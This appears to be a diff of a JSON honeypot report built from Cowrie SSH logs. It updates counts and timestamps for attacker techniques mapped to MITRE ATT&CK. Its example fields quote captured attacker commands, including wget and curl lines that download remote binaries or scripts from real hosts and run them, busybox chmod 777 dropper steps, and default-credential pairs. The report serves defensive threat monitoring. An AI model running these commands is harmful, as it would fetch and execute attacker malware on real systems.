@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-11 13:05:10",
+  "generated": "2026-10-11 14:05:39",
   "totals": {
-    "commands": 247831,
-    "login_failed": 417743,
-    "login_success": 62791,
-    "sessions": 428236
+    "commands": 247854,
+    "login_failed": 417798,
+    "login_success": 62794,
+    "sessions": 428322
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 417743,
+      "count": 417798,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-11T13:04:48.664967Z",
+      "last": "2026-10-11T14:00:54.115441Z",
       "unique_ips": 6273
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 62791,
+      "count": 62794,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,7 +37,7 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-11T13:01:24.991084Z",
+      "last": "2026-10-11T13:44:57.991860Z",
       "unique_ips": 5092
     },
     {
@@ -60,7 +60,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 20998,
+      "count": 21000,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -69,14 +69,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-10-11T13:02:20.887948Z",
+      "last": "2026-10-11T13:08:28.940426Z",
       "unique_ips": 1753
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 8284,
+      "count": 8288,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,7 +85,7 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-11T13:02:20.887948Z",
+      "last": "2026-10-11T13:08:29.108426Z",
       "unique_ips": 1631
     },
     {
@@ -335,15 +335,15 @@
   "unmapped": [
     [
       "sh",
-      56592
+      56595
     ],
     [
       "system",
-      56091
+      56093
     ],
     [
       "shell",
-      35005
+      35008
     ],
     [
       "/bin/busybox",
@@ -351,11 +351,11 @@
     ],
     [
       "enable",
-      3290
+      3292
     ],
     [
       "/bin/busybox HISILICON",
-      3159
+      3163
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -367,11 +367,11 @@
     ],
     [
       "ping; sh",
-      2201
+      2203
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      1084
+      1085
     ],
     [
       "linuxshell",
@@ -411,15 +411,15 @@
     ],
     [
       "cd /tmp || cd /var/tmp || cd /var || cd /dev/shm || cd /var/run || cd /data; rm -f .d .s .f; /bin/busybox HISILICON",
-      200
+      201
     ]
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "sessions": 9704,
-    "logins": 9049,
-    "commands": 3732,
-    "downloads": 313,
-    "unique_ips": 334
+    "sessions": 9184,
+    "logins": 8503,
+    "commands": 3531,
+    "downloads": 296,
+    "unique_ips": 328
   }
 }
